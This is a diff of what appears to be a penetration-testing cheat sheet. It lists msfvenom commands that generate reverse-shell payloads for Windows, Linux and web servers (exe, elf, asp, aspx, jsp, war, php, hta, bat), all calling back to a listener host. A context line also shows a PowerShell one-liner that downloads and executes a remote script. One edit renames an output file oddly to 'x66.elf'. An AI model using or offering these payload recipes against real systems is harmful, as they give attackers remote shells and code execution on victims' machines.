@@ -1765,16 +1765,20 @@ powershell -c "IEX (New-Object Net.WebClient).DownloadString(\"http://{LHOST}/re
 
 # Windows
 msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f exe > x86.exe 
-msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f exe > x64.exe   
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f exe > x64.exe 
+msfvenom -p cmd/windows/reverse_powershell LHOST={LHOST} LPORT=4444 > run.bat
+
 # Linux
 msfvenom -p linux/x86/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f elf > x86.elf
-msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f elf > x86.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f elf > x66.elf
 
 # Web
 msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f asp > shell.asp
+msfvenom -p windows/x64/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f aspx > shell.aspx
 msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f raw > shell.jsp
 msfvenom -p java/jsp_shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f war > shell.war
 msfvenom -p php/reverse_tcp LHOST={LHOST} LPORT=4444 -f raw > shell.php
+msfvenom -p windows/shell_reverse_tcp LHOST={LHOST} LPORT=4444 -f hta-psh > shell.hta
 
 Framework Executable Formats [--format <value>]
 ===============================================
